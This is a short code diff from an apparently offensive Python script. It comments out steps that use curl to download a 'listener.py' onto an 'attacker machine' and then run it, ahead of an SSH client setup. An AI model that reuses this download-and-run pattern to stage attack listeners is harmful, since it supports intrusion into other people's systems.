@@ -24,13 +24,13 @@ def run_command(cmd, timeout=30):
     except (subprocess.TimeoutExpired, FileNotFoundError) as e:
         return False, str(e)
     
-# download listener
-ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
-print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)
+# # download listener
+# ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
+# print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)
 
-# start listener
-ok, output = run_command(["python3", "listener.py"])
-print(f"listener run on attacker host" if ok else "Failed", "->", output)
+# # start listener
+# ok, output = run_command(["python3", "listener.py"])
+# print(f"listener run on attacker host" if ok else "Failed", "->", output)
 
 
 # Initialize the SSH client
